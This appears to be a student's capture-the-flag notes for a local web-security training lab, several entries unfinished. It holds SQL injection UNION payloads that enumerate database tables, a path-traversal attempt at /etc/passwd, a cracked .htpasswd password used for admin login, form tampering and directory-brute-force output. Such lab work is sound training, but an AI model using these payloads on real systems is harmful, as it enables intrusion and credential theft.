### Flag 00 03A944B434D5BAFF05F46C4BEDE5792551A2595574BCAFC9A6E25F67C382CCAA

The first vulnerability we found is the possibility to cheat very easily on a survey hosted on the website.
The server assumes the values as being from 1 to 10, but you can send the request with a much higher grade.

http://localhost:13080/?page=survey
Inspect option of Ben
Change value to 11 (negative didn't work)
03A944B434D5BAFF05F46C4BEDE5792551A2595574BCAFC9A6E25F67C382CCAA

### Flag 01 (WIP)

5 UNION SELECT COUNT(_), NULL FROM users --
5 UNION SELECT COUNT(_), first_name FROM users --

THIS LISTS ALL TABLE NAMES

```
6 UNION SELECT NULL, table_name FROM information_schema.tables--
```

this lists all column names

```
6 UNION SELECT NULL, column_name FROM information_schema.columns--
```

this lists all columns of the table users, we're using hex because strings are being escaped

```
6 UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name=0x7573657273--
```

listing all columns gave us this :

```
ID: 5 UNION SELECT NULL, column_name FROM information_schema.columns--
First name:
Surname : FLAG
```

which is sus

but after finding the table that this columbs belong to

```

ID: 5 UNION SELECT NULL, table_name FROM information_schema.columns WHERE column_name=0x464C4147--
First name:
Surname : INNODB_SYS_TABLES

```

and trying to get FLAG from it

```

5 UNION SELECT NULL, FLAG FROM INNODB_SYS_TABLES--

```

we get

```

Table 'Member_Sql_Injection.INNODB_SYS_TABLES' doesn't exist

```

### Flag 02 1D4855F7337C0C14B6F44946872C4EB33853F40B2D54393FBE94F49F1E19BBB0

http://localhost:13080/index.php?page=recover
Change webmaster@borntosec.com to whatever
1D4855F7337C0C14B6F44946872C4EB33853F40B2D54393FBE94F49F1E19BBB0

### Flag 03 0FBB54BBF7D099713CA4BE297E1BC7DA0173D8B3C21C1811B916A3A86652724E

http://localhost:13080/index.php?page=feedback
Name: a
0FBB54BBF7D099713CA4BE297E1BC7DA0173D8B3C21C1811B916A3A86652724E

### Flag 04 (WIP)

Hashcrack this http://localhost:13080/index.php?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f

### Flag 05 (WIP)

a weirdly loaded image http://localhost:13080/index.php?page=media&src=1

### Flag 06 (WIP)

Wtf?
http://localhost:13080/index.php?page=

### Flag 07 (WIP)

cookie I_am_admin

### Flag 08 d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff

http://localhost:8080/whatever/

htpasswd file

`root:437394baff5aa33daa618be47b75cb49`

Cracking the Password Using John the Ripper

To crack the password from the `.htpasswd` file using John the Ripper, run the following command:

```bash
../john/run/john --format=Raw-MD5 htpasswd
```

gives us

```
Enabling duplicate candidate password suppressor
qwerty123@       (root)
```

then

http://localhost:8080/admin/

connect using root and qwerty123@

### FLAG 09 (WIP)

http://localhost:8080/index.php?page=../../../../etc/passwd

ALMOST

http://localhost:8080/index.php?page=../../../../../var/log/httpd/access.log

STILL NOPE

### FLAG 10 (WIP)

SEARCH IMAGE, IMAGE NUMBER 5

comes up to

```
ID: 5
Title: Hack me ?
Url : borntosec.ddns.net/images.png
```

### TO NOTE

➜ utenret gobuster dir -u http://localhost:8080/ -w KaliLists/dirb/big.txt -b 200,975

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url: http://localhost:8080/
[+] Method: GET
[+] Threads: 10
[+] Wordlist: KaliLists/dirb/big.txt
[+] Negative Status codes: 200,975
[+] User Agent: gobuster/3.6
[+] Timeout: 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin (Status: 301) [Size: 193] [--> http://localhost/admin/]
/audio (Status: 301) [Size: 193] [--> http://localhost/audio/]
/css (Status: 301) [Size: 193] [--> http://localhost/css/]
/errors (Status: 301) [Size: 193] [--> http://localhost/errors/]
/fonts (Status: 301) [Size: 193] [--> http://localhost/fonts/]
/images (Status: 301) [Size: 193] [--> http://localhost/images/]
/includes (Status: 301) [Size: 193] [--> http://localhost/includes/]
/js (Status: 301) [Size: 193] [--> http://localhost/js/]
/whatever (Status: 301) [Size: 193] [--> http://localhost/whatever/]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================

```

```
